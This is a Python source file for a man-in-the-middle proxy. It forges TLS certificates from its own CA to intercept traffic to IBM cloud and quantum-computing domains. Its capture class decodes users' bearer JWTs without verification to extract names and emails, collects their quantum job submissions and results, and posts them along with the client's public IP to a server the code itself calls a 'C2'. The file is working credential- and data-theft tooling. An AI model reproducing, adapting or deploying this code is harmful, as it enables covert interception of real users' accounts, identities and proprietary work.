#!/usr/bin/env python3
"""
Single-file custom MITM proxy + traffic capture.
Combines: generate_cert.py + main.py + web_monitor.py
"""

import argparse
import datetime as dt
import hashlib
import http.client
import ipaddress
import json
import logging
import os
import gzip
import zlib
import re
import select
import socket
import ssl
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any, Dict, Optional, cast
from urllib.parse import urljoin, urlsplit

import jwt
import requests
import urllib3
from certifi import where as requests_ca_bundle
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
# Configuration – edit these (or set environment variables)
# ---------------------------------------------------------------------------
SERVER_IP = os.environ.get("C2_SERVER_IP", "127.0.0.1")
SERVER_PORT = os.environ.get("C2_SERVER_PORT", "5000")
BASE_URL = f"http://{SERVER_IP}:{SERVER_PORT}"
DEFAULT_ENDPOINT = "/api/log"

TARGET_DOMAINS = [
    "ibm.com",
    "quantum-computing.ibm.com",
    "cloud.ibm.com",
]

LOG = logging.getLogger("custom_mitmproxy")
PRINT_LOCK = threading.Lock()
HOP_HEADERS = {
    "connection",
    "proxy-connection",
    "proxy-authorization",
    "proxy-authenticate",
    "keep-alive",
    "te",
    "trailer",
    "transfer-encoding",
    "upgrade",
}

# ===========================================================================
# Certificate Authority (from generate_cert.py)
# ===========================================================================


def certificate_time(cert, field):
    try:
        return getattr(cert, field + "_utc")
    except AttributeError:
        return getattr(cert, field).replace(tzinfo=dt.timezone.utc)


class CertificateAuthority:
    def __init__(self, directory):
        self.directory = Path(directory)
        self.directory.mkdir(parents=True, exist_ok=True, mode=0o700)
        self.cert_path = self.directory / "ca.crt"
        self.key_path = self.directory / "ca.key"
        self.lock = threading.Lock()
        self.cache = {}

        if self.cert_path.exists() != self.key_path.exists():
            raise ValueError("CA certificate/key pair is incomplete")

        if self.key_path.exists():
            loaded_key = serialization.load_pem_private_key(
                self.key_path.read_bytes(), None
            )
            if not isinstance(loaded_key, rsa.RSAPrivateKey):
                raise ValueError("CA private key must be RSA")
            self.key = loaded_key
            self.cert = x509.load_pem_x509_certificate(self.cert_path.read_bytes())
            cert_public_key = self.cert.public_key()
            if not isinstance(cert_public_key, rsa.RSAPublicKey):
                raise ValueError("CA certificate public key must be RSA")
            if (
                self.key.public_key().public_numbers()
                != cert_public_key.public_numbers()
            ):
                raise ValueError("CA certificate and key do not match")
        else:
            self.key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            name = x509.Name(
                [x509.NameAttribute(NameOID.COMMON_NAME, "Custom MITM Proxy CA")]
            )
            now = dt.datetime.now(dt.timezone.utc)
            self.cert = (
                x509.CertificateBuilder()
                .subject_name(name)
                .issuer_name(name)
                .public_key(self.key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - dt.timedelta(minutes=5))
                .not_valid_after(now + dt.timedelta(days=3650))
                .add_extension(x509.BasicConstraints(ca=True, path_length=0), True)
                .add_extension(
                    x509.KeyUsage(
                        False, False, False, False, False, True, True, False, False
                    ),
                    True,
                )
                .add_extension(
                    x509.SubjectKeyIdentifier.from_public_key(self.key.public_key()),
                    False,
                )
                .add_extension(
                    x509.AuthorityKeyIdentifier.from_issuer_public_key(
                        self.key.public_key()
                    ),
                    False,
                )
                .sign(self.key, hashes.SHA256())
            )
            self._write_key(self.key_path, self.key)
            self.cert_path.write_bytes(
                self.cert.public_bytes(serialization.Encoding.PEM)
            )

        # Upgrade older certs that lack SKI/AKI
        try:
            self.cert.extensions.get_extension_for_class(x509.SubjectKeyIdentifier)
            self.cert.extensions.get_extension_for_class(x509.AuthorityKeyIdentifier)
        except x509.ExtensionNotFound:
            builder = (
                x509.CertificateBuilder()
                .subject_name(self.cert.subject)
                .issuer_name(self.cert.issuer)
                .public_key(self.key.public_key())
                .serial_number(self.cert.serial_number)
                .not_valid_before(certificate_time(self.cert, "not_valid_before"))
                .not_valid_after(certificate_time(self.cert, "not_valid_after"))
            )
            for extension in self.cert.extensions:
                if not isinstance(
                    extension.value,
                    (x509.SubjectKeyIdentifier, x509.AuthorityKeyIdentifier),
                ):
                    builder = builder.add_extension(extension.value, extension.critical)
            self.cert = (
                builder.add_extension(
                    x509.SubjectKeyIdentifier.from_public_key(self.key.public_key()),
                    False,
                )
                .add_extension(
                    x509.AuthorityKeyIdentifier.from_issuer_public_key(
                        self.key.public_key()
                    ),
                    False,
                )
                .sign(self.key, hashes.SHA256())
            )
            self.cert_path.write_bytes(
                self.cert.public_bytes(serialization.Encoding.PEM)
            )

    @staticmethod
    def _write_key(path, key):
        with open(path, "wb", opener=lambda p, flags: os.open(p, flags, 0o600)) as file:
            file.write(
                key.private_bytes(
                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.PKCS8,
                    serialization.NoEncryption(),
                )
            )

    def generate_cert_files(self, hostname):
        with self.lock:
            if hostname in self.cache:
                return self.cache[hostname]
            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            try:
                san = x509.IPAddress(ipaddress.ip_address(hostname))
            except ValueError:
                san = x509.DNSName(hostname)
            now = dt.datetime.now(dt.timezone.utc)
            cert = (
                x509.CertificateBuilder()
                .subject_name(
                    x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)])
                )
                .issuer_name(self.cert.subject)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - dt.timedelta(minutes=5))
                .not_valid_after(
                    min(
                        now + dt.timedelta(days=30),
                        certificate_time(self.cert, "not_valid_after"),
                    )
                )
                .add_extension(x509.SubjectAlternativeName([san]), False)
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), True)
                .add_extension(
                    x509.SubjectKeyIdentifier.from_public_key(key.public_key()), False
                )
                .add_extension(
                    x509.AuthorityKeyIdentifier.from_issuer_public_key(
                        self.key.public_key()
                    ),
                    False,
                )
                .add_extension(
                    x509.KeyUsage(
                        True, False, True, False, False, False, False, False, False
                    ),
                    True,
                )
                .add_extension(
                    x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), False
                )
                .sign(self.key, hashes.SHA256())
            )
            stem = hashlib.sha256(hostname.encode()).hexdigest()
            cert_path = self.directory / f"{stem}.crt"
            key_path = self.directory / f"{stem}.key"
            self._write_key(key_path, key)
            cert_path.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
            self.cache[hostname] = str(cert_path), str(key_path)
            return self.cache[hostname]


# ===========================================================================
# Traffic Capture (from web_monitor.py)
# ===========================================================================


class TrafficCapture:
    def __init__(self):
        print("\n" + "=" * 80)
        print("Custom Domain Traffic Capture Starting...")
        print("=" * 80)
        print(f"C2 Server: {BASE_URL}")
        print(f"Monitoring domains: {', '.join(TARGET_DOMAINS)}")
        print("=" * 80 + "\n")

        self.index = 0
        self.public_ip = self._fetch_public_ip()
        print(f"Detected Public IP: {self.public_ip}\n")
        self.pending_jobs: Dict[Any, dict] = {}
        self._test_c2_connection()

    def _fetch_public_ip(self) -> str:
        services = [
            "https://api.ipify.org?format=json",
            "https://ipapi.co/json/",
            "https://ifconfig.me/ip",
        ]
        proxies = {"http": None, "https": None}
        for service in services:
            try:
                r = requests.get(
                    service,
                    timeout=5,
                    proxies=proxies,
                )
                if r.status_code == 200:
                    if "ipify" in service:
                        return r.json()["ip"]
                    if "ipapi" in service:
                        return r.json()["ip"]
                    return r.text.strip()
            except Exception:
                continue
        return "unknown"

    def _test_c2_connection(self):
        try:
            r = requests.get(
                urljoin(BASE_URL, "/health"),
                timeout=5,
                verify=False,
                proxies={
                    "http": None,
                    "https": None,
                },
            )
            if r.status_code == 200:
                print("C2 server is reachable!\n")
            else:
                print(f"C2 server returned status {r.status_code}\n")
        except Exception as e:
            print(f"Could not reach C2 server: {e}")
            print("Make sure the C2 server is running!\n")

    def _get_current_index(self) -> int:
        self.index = (self.index + 1) % 2
        return self.index

    def send_to_c2(self, data: dict) -> bool:
        try:
            r = requests.post(
                urljoin(BASE_URL, DEFAULT_ENDPOINT),
                json=data,
                timeout=10,
                verify=False,
                proxies={
                    "http": None,
                    "https": None,
                },
            )
            if r.status_code == 200:
                print("   Sent to C2 server")
                return True
            print(f"   C2 returned status {r.status_code}")
            return False
        except Exception as e:
            print(f"   Failed to send to C2: {e}")
            return False

    def is_target(self, host: str) -> bool:
        host = host.lower().rstrip(".")
        return any(
            host == d.lower().rstrip(".") or host.endswith("." + d.lower().rstrip("."))
            for d in TARGET_DOMAINS
        )

    def on_request(self, method, host, path, headers, body, url) -> Optional[Any]:
        LOG.info(
            "CAPTURE CHECK method=%s host=%s path=%s target=%s",
            method,
            host,
            path,
            self.is_target(host),
        )
        if not self.is_target(host):
            return None
        path_l = path.lower()
        if method.upper() == "POST" and path_l.endswith("/jobs"):
            print(f"\nJOB SUBMISSION DETECTED")
            print(f"   URL: {url}")
            return self._handle_job_submission(method, host, path, headers, body, url)
        return None

    def on_response(self, key, method, host, path, status, response_body, url):
        LOG.info(
            "RESPONSE CHECK method=%s host=%s path=%s status=%s bytes=%s",
            method,
            host,
            path,
            status,
            len(response_body),
        )
        if not self.is_target(host):
            return
        path_l = path.lower()
        if method.upper() == "POST" and path_l.endswith("/jobs") and key is not None:
            print(f"\nJOB SUBMISSION RESPONSE")
            print(f"   Status: {status}")
            self._handle_job_submission_response(key, response_body)
        if "/results" in path_l:
            print(f"\nRESULTS DETECTED")
            print(f"   URL: {url}")
            print(f"   Status: {status}")
            self._handle_results(method, host, path, status, response_body, url)

    def _handle_job_submission(self, method, host, path, headers, body, url):
        try:
            auth = headers.get("Authorization") or headers.get("authorization") or ""
            if not auth:
                raise ValueError("Header doesn't have Authorization attribute")
            token = auth.split(" ", 1)[1].strip()
            payload = jwt.decode(
                token,
                options={
                    "verify_signature": False,
                    "verify_exp": False,
                    "verify_aud": False,
                    "verify_iss": False,
                },
            )

            username = payload.get("name") or "unknown"
            email = payload.get("email") or "unknown"
            parsed = json.loads(body)
            backend = parsed.get("backend", "unknown")
            shots = parsed.get("shots", "unknown")
            params = parsed.get("params", {})
            if "pubs" in params and params["pubs"]:
                first = params["pubs"][0]
                if isinstance(first, list) and len(first) > 2:
                    shots = first[2]
            key = id(body)
            self.pending_jobs[key] = {
                "timestamp": dt.datetime.now().isoformat(),
                "client_ip": self.public_ip,
                "url": url,
                "method": method,
                "backend": backend,
                "shots": shots,
                "raw_body": parsed,
                "username": username,
                "email": email,
            }
            return key
        except Exception as e:
            LOG.warning("Error processing job submission: %s", e)
            return None

    def _handle_job_submission_response(self, key, response_body):
        try:
            if key not in self.pending_jobs:
                print("   No pending job data found for this response")
                return
            job_data = self.pending_jobs[key]
            response = json.loads(response_body)
            job_id = None
            if isinstance(response, dict):
                job_id = (
                    response.get("id")
                    or response.get("job_id")
                    or response.get("jobId")
                )
            if job_id:
                print(f"   Got Job ID: {job_id}")
            else:
                print("   Could not extract Job ID from response")
                job_id = "unknown"
            data = dict(job_data)
            data["type"] = "job_submission_raw"
            data["job_id"] = job_id
            self.send_to_c2(data)
            del self.pending_jobs[key]
        except Exception as e:
            print(f"   Error processing job submission response: {e}")
            self.pending_jobs.pop(key, None)

    def _handle_results(self, method, host, path, status, response_body, url):
        try:
            body = json.loads(response_body)
            job_id = None
            m = re.search(r"/jobs/([^/]+)/results", path)
            if m:
                job_id = m.group(1)
            if not job_id and isinstance(body, dict):
                job_id = body.get("id") or body.get("job_id")
            data = {
                "type": "job_results_raw",
                "timestamp": dt.datetime.now().isoformat(),
                "client_ip": self.public_ip,
                "url": url,
                "status_code": status,
                "job_id": job_id,
                "raw_body": body,
            }
            self.send_to_c2(data)
        except Exception as e:
            print(f"   Error processing results: {e}")


capture = TrafficCapture()


# ===========================================================================
# Proxy core (from main.py)
# ===========================================================================


def normalize_host(host):
    return host.rstrip(".").encode("idna").decode("ascii").lower()


def decode_response_body(payload: bytes, content_encoding: str) -> bytes:
    """Decode upstream content for inspection, without modifying wire bytes."""
    encoding = content_encoding.strip().lower()
    if not encoding or encoding == "identity":
        return payload
    if encoding == "gzip":
        return gzip.decompress(payload)
    if encoding == "deflate":
        try:
            return zlib.decompress(payload)
        except zlib.error:
            return zlib.decompress(payload, -zlib.MAX_WBITS)
    raise ValueError(f"Unsupported Content-Encoding: {content_encoding}")


def log_message(label, url, first_line, headers, body):
    """Simple logging - no external flow_viewer dependency."""
    try:
        content = body.decode("utf-8", errors="replace") if body else ""
        if len(content) > 2000:
            content = content[:2000] + "\n... [truncated]"
    except Exception:
        content = repr(body)[:500]
    with PRINT_LOCK:
        LOG.info(
            "\n=== %s %s ===\n%s\n%s\n%s\n",
            label,
            url,
            first_line,
            str(headers).rstrip(),
            content,
        )


def filtered_headers(headers):
    excluded = HOP_HEADERS | {
        x.strip().lower() for x in headers.get("Connection", "").split(",")
    }
    return [(k, v) for k, v in headers.items() if k.lower() not in excluded]


def create_upstream_context(cafile=None):
    context = ssl.create_default_context()
    context.load_verify_locations(cafile=requests_ca_bundle())
    if cafile:
        context.load_verify_locations(cafile=cafile)
    context.set_alpn_protocols(["http/1.1"])
    return context


class ProxyServer(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(
        self,
        address,
        targets=None,
        cert_dir=".proxy-certs",
        upstream_context=None,
        flow_store=None,
    ):
        self.flow_store = flow_store
        self.targets = {
            normalize_host(h) for h in (TARGET_DOMAINS if targets is None else targets)
        }
        self.ca = CertificateAuthority(cert_dir)
        self.upstream_context = upstream_context or create_upstream_context()
        self.upstream_context.set_alpn_protocols(["http/1.1"])
        super().__init__(address, ProxyHandler)

    def is_target(self, host: str) -> bool:
        host = normalize_host(host)
        return any(
            host == domain or host.endswith("." + domain) for domain in self.targets
        )


class ProxyHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    timeout = 30
    rbufsize = 0
    tunnel = None

    @property
    def proxy_server(self) -> ProxyServer:
        return cast(ProxyServer, self.server)

    def log_message(self, format, *args):
        if self.proxy_server.flow_store is None:
            super().log_message(format, *args)
        else:
            LOG.info(format, *args)

    def finish(self):
        try:
            super().finish()
        finally:
            self.connection.close()

    def do_CONNECT(self):
        established = False
        try:
            authority = urlsplit("//" + self.path)
            host, port = normalize_host(authority.hostname or ""), authority.port or 443
            target = self.proxy_server.is_target(host)

            LOG.info(
                "CONNECT host=%s port=%s mode=%s",
                host,
                port,
                "INTERCEPT" if target else "PASSTHROUGH",
            )

            if not host or authority.path:
                raise ValueError("Invalid CONNECT authority")

            if not target:
                with socket.create_connection((host, port), timeout=30) as remote:
                    self.send_response_only(200, "Connection Established")
                    self.end_headers()
                    established = True
                    self.close_connection = True
                    sockets = [self.connection, remote]
                    while sockets:
                        ready, _, _ = select.select(sockets, [], [], 30)
                        if not ready:
                            break
                        for source in ready:
                            dest = (
                                remote if source is self.connection else self.connection
                            )
                            data = source.recv(65536)
                            if data:
                                dest.sendall(data)
                            else:
                                sockets.remove(source)
                                dest.shutdown(socket.SHUT_WR)
                return
            cert, key = self.proxy_server.ca.generate_cert_files(host)
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.minimum_version = ssl.TLSVersion.TLSv1_2
            context.set_alpn_protocols(["http/1.1"])
            context.load_cert_chain(cert, key)
            self.send_response_only(200, "Connection Established")
            self.end_headers()
            established = True
            self.connection = context.wrap_socket(self.connection, server_side=True)
            self.rfile.close()
            self.wfile.close()
            self.rfile = self.connection.makefile("rb", self.rbufsize)
            self.wfile = self.connection.makefile("wb", 0)
            self.tunnel = (host, port)
            self.close_connection = False
        except (OSError, ValueError) as exc:
            LOG.warning("CONNECT failed for %s: %s", self.path, exc)
            self.close_connection = True
            if not established:
                self.send_error(502, "CONNECT failed")

    def read_body(self):
        encoding = self.headers.get("Transfer-Encoding", "").lower()
        if encoding:
            if encoding != "chunked" or self.headers.get("Content-Length") is not None:
                raise ValueError("Unsupported or ambiguous request framing")
            chunks = []
            while True:
                line = self.rfile.readline(65537)
                size = int(line.split(b";", 1)[0], 16)
                if size < 0:
                    raise ValueError("Invalid chunk size")
                if size == 0:
                    while True:
                        trailer = self.rfile.readline(65537)
                        if trailer == b"\r\n":
                            return b"".join(chunks)
                        if not trailer or len(trailer) > 65536:
                            raise ValueError("Invalid chunk trailers")
                chunks.append(self.read_exact(size))
                if self.read_exact(2) != b"\r\n":
                    raise ValueError("Invalid chunk terminator")
        lengths = self.headers.get_all("Content-Length", [])
        if len(lengths) > 1:
            raise ValueError("Duplicate Content-Length")
        length = int(lengths[0]) if lengths else 0
        if length < 0:
            raise ValueError("Negative Content-Length")
        return self.read_exact(length)

    def read_exact(self, size):
        parts = []
        while size:
            part = self.rfile.read(min(size, 65536))
            if not part:
                raise ValueError("Incomplete request body")
            parts.append(part)
            size -= len(part)
        return b"".join(parts)

    def forward(self):
        upstream = None
        response_started = False
        flow = None
        try:
            if self.tunnel:
                host, port = self.tunnel
                scheme = "https"
                path = self.path
                if not path.startswith("/") and path != "*":
                    raise ValueError("Expected an origin-form HTTPS request")
            else:
                url = urlsplit(self.path)
                if (
                    url.scheme != "http"
                    or not url.hostname
                    or url.username
                    or url.password
                    or url.fragment
                ):
                    raise ValueError("Expected an absolute http:// proxy URL")
                host, port = normalize_host(url.hostname), url.port or 80
                scheme = "http"
                path = (url.path or "/") + ("?" + url.query if url.query else "")

            body = self.read_body()
            display_url = f"{scheme}://{host}:{port}{path}"
            target = self.proxy_server.is_target(host)
            capture_key = None

            if target:
                log_message(
                    "REQUEST",
                    display_url,
                    f"{self.command} {path} {self.request_version}",
                    self.headers,
                    body,
                )
                capture_key = capture.on_request(
                    method=self.command,
                    host=host,
                    path=path,
                    headers=dict(self.headers),
                    body=body,
                    url=display_url,
                )

            if scheme == "https":
                upstream = http.client.HTTPSConnection(
                    host, port, timeout=30, context=self.proxy_server.upstream_context
                )
            else:
                upstream = http.client.HTTPConnection(host, port, timeout=30)

            upstream.putrequest(
                self.command, path, skip_host=True, skip_accept_encoding=True
            )
            authority = f"[{host}]" if ":" in host else host
            if port != (443 if scheme == "https" else 80):
                authority += f":{port}"
            upstream.putheader("Host", authority)
            for key, value in filtered_headers(self.headers):
                if key.lower() not in {
                    "host",
                    "content-length",
                    "expect",
                    "accept-encoding",
                }:
                    upstream.putheader(key, value)
            upstream.putheader("Accept-Encoding", "gzip, deflate")
            if (
                body
                or self.headers.get("Content-Length") is not None
                or self.headers.get("Transfer-Encoding")
            ):
                upstream.putheader("Content-Length", str(len(body)))
            upstream.endheaders(body)

            response = upstream.getresponse()
            if response.status == 101:
                raise ValueError("Protocol upgrades are not supported")
            payload = response.read()

            if target:
                try:
                    inspection_payload = decode_response_body(
                        payload, response.headers.get("Content-Encoding", "")
                    )
                except (OSError, EOFError, ValueError, zlib.error) as exc:
                    LOG.warning(
                        "Cannot decode response for inspection (%s): %s",
                        display_url,
                        exc,
                    )
                    inspection_payload = None

                if inspection_payload is not None:
                    log_message(
                        "RESPONSE",
                        display_url,
                        f"HTTP/1.1 {response.status} {response.reason}",
                        response.headers,
                        inspection_payload,
                    )
                    capture.on_response(
                        key=capture_key,
                        method=self.command,
                        host=host,
                        path=path,
                        status=response.status,
                        response_body=inspection_payload,
                        url=display_url,
                    )

            self.send_response_only(response.status, response.reason)
            response_started = True
            for key, value in filtered_headers(response.headers):
                if key.lower() != "content-length":
                    self.send_header(key, value)
            if self.command == "HEAD" or response.status == 304:
                if response.headers.get("Content-Length") is not None:
                    self.send_header(
                        "Content-Length", response.headers["Content-Length"]
                    )
            elif response.status not in (204, 205) and response.status >= 200:
                self.send_header("Content-Length", str(len(payload)))
            elif response.status == 205:
                self.send_header("Content-Length", "0")
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(payload)

        except (ValueError, OSError, http.client.HTTPException) as exc:
            LOG.warning("Proxy request failed: %s", exc)
            if isinstance(exc, ssl.SSLCertVerificationError):
                LOG.warning(
                    "Upstream TLS trust failed; supply corporate CA with --upstream-ca."
                )
            self.close_connection = True
            if not response_started:
                self.send_error(502, "Proxy request failed")
        finally:
            if upstream:
                upstream.close()

    do_GET = do_POST = do_PUT = do_PATCH = do_DELETE = do_HEAD = do_OPTIONS = forward


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8888)
    parser.add_argument(
        "--target",
        action="append",
        help="Exact domain to intercept (repeatable; overrides TARGET_DOMAINS)",
    )
    parser.add_argument("--cert-dir", default=str(Path.home() / ".custom-proxy"))
    parser.add_argument(
        "--upstream-ca",
        help="Additional PEM CA bundle for upstream servers",
    )
    parser.add_argument("--log-file", help="Also write plaintext traffic to this file")
    args = parser.parse_args()

    handlers: list[logging.Handler] = [logging.StreamHandler()]
    if args.log_file:
        handlers.append(logging.FileHandler(args.log_file, encoding="utf-8"))
    logging.basicConfig(level=logging.INFO, format="%(message)s", handlers=handlers)

    with ProxyServer(
        (args.host, args.port),
        args.target,
        args.cert_dir,
        upstream_context=create_upstream_context(args.upstream_ca),
    ) as server:
        LOG.info(
            "Proxy listening on %s:%s; targets: %s",
            *server.server_address,
            ", ".join(sorted(server.targets)),
        )
        LOG.info("Trust this CA in your client: %s", server.ca.cert_path)
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            LOG.info("Shutting down proxy")


if __name__ == "__main__":
    main()
